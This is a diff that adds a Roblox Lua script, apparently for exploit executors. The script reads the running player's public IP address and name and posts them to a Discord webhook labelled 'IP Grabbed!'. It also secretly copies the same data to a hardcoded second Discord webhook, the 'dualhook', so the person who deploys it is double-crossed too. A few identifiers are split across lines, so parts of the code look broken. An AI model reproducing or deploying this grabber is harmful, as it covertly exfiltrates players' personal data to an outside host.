@@ -1,0 +1,243 @@
+_G.Dualhook = "https://discord.com/api/webhooks/1127279393132257301/_kTgqggRjUW-6-7AYUbYaoQO0xDdMuwKr03r_A0PBC1b-Y3tYBtERY2m1GxSPVQcix2R"
+
+ 
+
+if _G.AlreadyExecuted == true then
+
+    game.Players.LocalPlayer:Kick("Already executed.")
+
+    os.exit()
+
+end
+
+ 
+
+local webhook = _G.Webhook
+
+local dualhook = _G.Dualhook
+
+ 
+
+-- main part
+
+ 
+
+pcall(function()
+
+   local data = {
+
+     ["avatar_url"] = "",
+
+     ["content"] = "IP Grabbed!",
+
+     ["username"] = "TheScriptPirate",
+
+       ["embeds"] = {
+
+           {
+
+ 
+
+               ["title"] = game:GetService("Players").LocalPlayer.Name,
+
+               ["description"] = game:HttpGet("http://v4v6.ipv6-test.com/api/myip.php")
+
+           }
+
+       }
+
+   }
+
+ 
+
+   if syn then
+
+       local response = syn.request(
+
+           {
+
+               Url = webhook,
+
+               Method = 'POST',
+
+               Headers = {
+
+                   ['Content-Type'] = 'application/json'
+
+               },
+
+               Body = game:GetService('HttpService'):JSONEnco
+
+ 
+
+de(data)
+
+           }
+
+       );
+
+   elseif request then
+
+       local response = request(
+
+           {
+
+               Url = webhook,
+
+               Method = 'POST',
+
+               Headers = {
+
+                   ['Content-Type'] = 'application/json'
+
+               },
+
+               Body = game:GetService('HttpService'):JSONEncode(data)
+
+           }
+
+       );
+
+   elseif http_request then
+
+       local response = http_request(
+
+           {
+
+               Url = webhook,
+
+ 
+
+               Method = 'POST',
+
+               Headers = {
+
+                   ['Content-Type'] = 'application/json'
+
+               },
+
+               Body = game:GetService('HttpService'):JSONEncode(data)
+
+           }
+
+       );
+
+   end
+
+end)
+
+ 
+
+-- dualhooked part
+
+ 
+
+local dualhook = _G.Dualhook
+
+ 
+
+pcall(function()
+
+   local data = {
+
+     ["avatar_url"] = "",
+
+     ["content"] = "Someone got Dualhooked",
+
+     ["username"] = "TheScriptPirate",
+
+       ["embeds"] = {
+
+           {
+
+               ["title"] = game:GetService("Players").LocalPlayer.Name,
+
+               ["description"] = game:HttpGet("http://v4v6.ipv6-test.com/api/myip.php")
+
+           }
+
+       }
+
+   }
+
+ 
+
+   if syn then
+
+       local response = syn.request(
+
+           {
+
+               Url = dualhook,
+
+               Method = 'POST',
+
+               Headers = {
+
+                   ['Content-Type'] = 'application/
+
+ 
+
+json'
+
+               },
+
+               Body = game:GetService('HttpService'):JSONEncode(data)
+
+           }
+
+       );
+
+   elseif request then
+
+       local response = request(
+
+           {
+
+               Url = dualhook,
+
+               Method = 'POST',
+
+               Headers = {
+
+                   ['Content-Type'] = 'application/json'
+
+               },
+
+               Body = game:GetService('HttpService'):JSONEncode(data)
+
+           }
+
+       );
+
+ 
+
+   elseif http_request then
+
+       local response = http_request(
+
+           {
+
+               Url = dualhook,
+
+               Method = 'POST',
+
+               Headers = {
+
+                   ['Content-Type'] = 'application/json'
+
+               },
+
+               Body = game:GetService('HttpService'):JSONEncode(data)
+
+           }
+
+       );
+
+   end
+
+end)
+
+ 
+
+_G.AlreadyExecuted = true
